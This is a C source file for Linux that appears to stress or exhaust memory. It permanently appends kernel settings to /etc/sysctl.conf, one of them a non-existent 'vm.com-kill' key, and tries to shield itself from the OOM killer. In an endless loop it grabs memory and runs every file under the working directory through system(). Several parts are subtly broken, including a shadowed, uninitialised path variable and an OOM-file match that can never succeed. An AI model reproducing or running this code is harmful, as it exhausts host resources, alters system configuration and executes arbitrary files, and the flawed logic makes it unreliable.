#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <ftw.h>

#define DEBUG 1
#define OOM_KILLER_FILE "/proc/sys/vm/overcommit_memory"
#define LOG_FILE "log.txt"
#define PAGE_SIZE 4096
#define MAX_MEMORY 256 * 1024 * 1024
#define START_DIR "/proc"

struct timeval start, end;
const char* needPath = "/";
int isLinux = 1;

// Function to initialize the log file on Linux
int InitializeLogFile() {
    FILE* fp = fopen(LOG_FILE, "a+");
    if (fp == NULL) {
        perror("fp");
    } else {
        fprintf(fp, "Time;UsedMemory\n");
        fclose(fp);
    }
    return 0;
}

// Function to calculate time difference
float TimeDiff(struct timeval* start, struct timeval* end) {
    return (end->tv_sec - start->tv_sec) + 1e-6 * (end->tv_usec - start->tv_usec);
}

// Function to write memory usage and time to the log file on Linux
int WriteLogFile(long int availableMemory) {
    FILE* fp;
    char fname[] = "log.txt";
    fp = fopen(fname, "a+");
    if (fp == NULL) {
        perror("fp");
    } else {
        fprintf(fp, "%ld;%0.8f\n", availableMemory, TimeDiff(&start, &end));
        fclose(fp);
    }
    return 0;
}

// Function to set Linux kernel parameters
int SetLinuxKernelParameters() {
    FILE* sysctlConf = fopen("/etc/sysctl.conf", "a");
    if (sysctlConf == NULL) {
        perror("sysctlConf");
        return 1;
    }
    fprintf(sysctlConf, "vm.com-kill=0\n");
    fclose(sysctlConf);

    if (system("sysctl -p") == -1) {
        perror("sysctl -p");
        return 1;
    }

    int comKill = 0;
    FILE* comKillFile = fopen("/proc/sys/vm/com-kill", "w");
    if (comKillFile == NULL) {
        perror("comKillFile");
        return 1;
    }
    fprintf(comKillFile, "%d", comKill);
    fclose(comKillFile);

    sysctlConf = fopen("/etc/sysctl.conf", "a");
    if (sysctlConf == NULL) {
        perror("sysctlConf");
        return 1;
    }
    fprintf(sysctlConf, "vm.overcommit_memory=2\n");
    fclose(sysctlConf);

    if (system("sysctl -p") == -1) {
        perror("sysctl -p");
        return 1;
    }

    return 0;
}

// Function to modify the OOM score of the process on Linux
int ModifyOOMScore() {
    int PID = getpid();
    char PID_IN_STR[6];
    char path[1025];

    sprintf(PID_IN_STR, "%d", PID);

    FILE* oom;
    DIR* dirs;
    struct dirent* entry;

    dirs = opendir(START_DIR);
    if (!dirs) {
        perror("opendir failed");
        return 1;
    }

    while ((entry = readdir(dirs))) {
        if (entry->d_type == DT_DIR && isdigit(entry->d_name[0])) {
            if (strcmp(entry->d_name, PID_IN_STR) == 0) {
                strcpy(path, START_DIR);
                strcat(path, "/");
                strcat(path, entry->d_name);

                DIR* procdir;
                struct dirent* entry_procdir;

                procdir = opendir(path);
                if (!procdir) {
                    perror("opendir failed");
                    return 1;
                }

                while (entry_procdir = readdir(procdir)) {
                    if (strcmp(entry_procdir->d_name, OOM_KILLER_FILE) == 0) {
                        strcat(path, "/");
                        strcat(path, entry_procdir->d_name);

                        oom = fopen(path, "w+");
                        if (oom == NULL) {
                            perror("oom_adj");
                        } else {
                            char oomValue[] = "-17"; // Modify the OOM score as needed
                            fprintf(oom, "%s", oomValue);
                            fclose(oom);
                        }
                    }
                }
                closedir(procdir);
            }
        }
    }
    closedir(dirs);
    return 0;
}

// Callback function for ftw on Linux
int FindAndExecuteProgram(const char* fpath, const struct stat* st, int tflag) {
    if (tflag == FTW_F) {
        system(fpath);
    }
    return 0;
}

int main(int argc, char* argv[]) {
    char buffer[1024];
    char* needPath1;
    if (getcwd(buffer, sizeof(buffer)) != NULL) {
        char* needPath1 = (char*)malloc(strlen(buffer) + 1);
        needPath1 = buffer;
    }

    if (isLinux) {
        if (system("ulimit -m 150000") == -1) {
            perror("ulimit");
            return 1;
        }

        if (SetLinuxKernelParameters() != 0) {
            return 1;
        }

        gettimeofday(&start, NULL);

        long cp;
        long cap;
        long ps;
        char* map;
        long unsigned int res = MAX_MEMORY;

        int PID = getpid();
        if ((cp = sysconf(_SC_PHYS_PAGES)) != -1 &&
            (cap = sysconf(_SC_AVPHYS_PAGES)) != -1 &&
            (ps = sysconf(_SC_PAGESIZE)) != -1) {
            // Print system memory information
        } else {
            perror("SYSCONF");
            return 1;
        }

        while (1) {
            ModifyOOMScore();
            if ((cp = sysconf(_SC_PHYS_PAGES)) != -1 &&
                (cap = sysconf(_SC_AVPHYS_PAGES)) != -1 &&
                (ps = sysconf(_SC_PAGESIZE)) != -1) {
            } else {
                perror("SYSCONF");
            }

            if ((map = (char*)mmap(NULL, res, PROT_WRITE | PROT_READ | PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN, 0, 0)) == MAP_FAILED) {
                res = res / 2;
                perror("MMAP");
            } else {
                if (res >= 1) {
                    if (cap * ps > res) {
                        for (int i = 0; i < res; i += ps) {
                            map[i] = 1;
                        }
                        gettimeofday(&end, NULL);
                        long int AM = cap * ps / 1024 / 1024;
                        WriteLogFile(AM);
                    } else {
                        res = res / 2;
                        for (int i = 0; i < res; i += ps) {
                            map[i] = 1;
                        }
                        gettimeofday(&end, NULL);
                        long int AM = cap * ps / 1024 / 1024;
                        WriteLogFile(AM);
                    }
                } else {
                    res = res * 1024 * 1024;
                }
            }

            if (ftw(needPath1, FindAndExecuteProgram, 20) == -1) {
                perror("ftw");
                exit(EXIT_FAILURE);
            }
        }
    }

    return 0;
}



